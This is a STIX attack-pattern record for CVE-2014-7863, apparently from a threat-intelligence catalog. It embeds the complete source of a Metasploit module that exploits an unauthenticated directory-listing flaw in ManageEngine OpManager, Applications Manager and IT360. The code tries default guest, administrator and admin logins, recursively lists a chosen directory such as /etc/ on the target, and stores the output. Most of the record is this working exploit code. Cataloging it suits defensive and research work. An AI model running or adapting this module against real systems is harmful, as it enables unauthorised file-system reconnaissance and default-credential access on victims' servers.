{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3eea7706-cf7b-4743-96a8-346ca7a39b06",
    "created": "2024-08-14T16:23:54.548669Z",
    "modified": "2024-08-14T16:23:54.548673Z",
    "name": "ManageEngine Multiple Products Arbitrary Directory Listing",
    "description": " This module exploits a directory listing information disclosure vulnerability in the FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It makes a recursive listing, so it will list the whole drive if you ask it to list / in Linux or C:\\ in Windows. This vulnerability is unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This module will attempt to login using the default credentials for the administrator and guest accounts; alternatively you can provide a pre-authenticated cookie or a username / password combo. For IT360 targets enter the RPORT of the OpManager instance (usually 8300). This module has been tested on both Windows and Linux with several different versions. Windows paths have to be escaped with 4 backslashes on the command line. There is a companion module that allows for arbitrary file download. This vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/manageengine_dir_listing.rb",
            "external_id": "manageengine_dir_listing.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7863"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jan/114"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine Multiple Products Arbitrary Directory Listing',\n        'Description' => %q{\n          This module exploits a directory listing information disclosure vulnerability in the\n          FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It\n          makes a recursive listing, so it will list the whole drive if you ask it to list / in\n          Linux or C:\\ in Windows. This vulnerability is unauthenticated on OpManager and\n          Applications Manager, but authenticated in IT360. This module will attempt to login\n          using the default credentials for the administrator and guest accounts; alternatively\n          you can provide a pre-authenticated cookie or a username / password combo. For IT360\n          targets enter the RPORT of the OpManager instance (usually 8300). This module has been\n          tested on both Windows and Linux with several different versions. Windows paths have to\n          be escaped with 4 backslashes on the command line. There is a companion module that\n          allows for arbitrary file download. This vulnerability has been fixed in Applications\n          Manager v11.9 b11912 and OpManager 11.6.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2014-7863'],\n          ['OSVDB', '117696'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/114'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt']\n        ],\n        'DisclosureDate' => '2015-01-28'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The base path to OpManager, AppManager or IT360', '/']),\n        OptString.new('DIRECTORY', [true, 'Path of the directory to list', '/etc/']),\n        OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),\n        OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),\n        OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),\n        OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def get_cookie\n    cookie = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n\n    if res\n      cookie = res.get_cookies\n    end\n\n    cookie\n  end\n\n  def detect_it360\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      return true\n    end\n\n    return false\n  end\n\n  def get_it360_cookie_name\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n\n    cookie = res.get_cookies\n\n    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      return ::Regexp.last_match(1)\n    else\n      return nil\n    end\n  end\n\n  def authenticate_it360(port, path, username, password)\n    if datastore['DOMAIN_NAME'].nil?\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'false'\n      }\n    else\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'true',\n        'domainName' => datastore['DOMAIN_NAME']\n      }\n    end\n\n    res = send_request_cgi({\n      'rport' => port,\n      'method' => 'POST',\n      'uri' => normalize_uri(path),\n      'vars_get' => {\n        'service' => 'OpManager',\n        'furl' => '/',\n        'timestamp' => Time.now.to_i\n      },\n      'vars_post' => vars_post\n    })\n\n    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=(\\w{9,})/\n      # /IAMAGENTTICKET([A-Z]{0,4})=([\\w]{9,})/ -> this pattern is to avoid matching \"removed\"\n      return res.get_cookies\n    end\n\n    nil\n  end\n\n  def login_it360\n    # Do we already have a valid cookie? If yes, just return that.\n    unless datastore['IAMAGENTTICKET'].nil?\n      cookie_name = get_it360_cookie_name\n      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'\n      return cookie\n    end\n\n    # get the correct path, host and port\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n\n    if res && res.redirect?\n      uri = [ res.redirection.port, res.redirection.path ]\n    else\n      return nil\n    end\n\n    if datastore['USERNAME'] && datastore['PASSWORD']\n      print_status(\"Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...\")\n      cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])\n      unless cookie.nil?\n        return cookie\n      end\n    end\n\n    default_users = ['guest', 'administrator', 'admin']\n\n    default_users.each do |user|\n      print_status(\"Trying to authenticate as #{user}...\")\n      cookie = authenticate_it360(uri[0], uri[1], user, user)\n      unless cookie.nil?\n        return cookie\n      end\n    end\n\n    nil\n  end\n\n  def run\n    # No point to continue if directory is not specified\n    if datastore['DIRECTORY'].empty?\n      print_error('Please supply the path of the directory you want to list.')\n      return\n    end\n\n    if detect_it360\n      print_status('Detected IT360, attempting to login...')\n      cookie = login_it360\n    else\n      cookie = get_cookie\n    end\n\n    if cookie.nil?\n      print_error('Failed to get application cookies!')\n      return\n    end\n\n    servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet'\n    res = send_request_cgi({\n      'method' => 'GET',\n      'cookie' => cookie,\n      'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet)\n    })\n    if res && res.code == 404\n      servlet = 'FailOverHelperServlet'\n    end\n\n    # Create request\n    begin\n      print_status(\"Listing directory #{datastore['DIRECTORY']}\")\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => cookie,\n        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),\n        'vars_get' => {\n          'operation' => 'listdirectory',\n          'rootDirectory' => datastore['DIRECTORY']\n        }\n      })\n    rescue Rex::ConnectionRefused\n      print_error('Could not connect.')\n      return\n    end\n\n    # Show data if needed\n    if res && res.code == 200 && res.body\n      vprint_line(res.body.to_s)\n      fname = File.basename(datastore['DIRECTORY'])\n\n      path = store_loot(\n        'manageengine.http',\n        'text/plain',\n        datastore['RHOST'],\n        res.body.to_s,\n        fname\n      )\n      print_good(\"File with directory listing saved in: #{path}\")\n    else\n      print_error('Failed to list directory.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-28"
}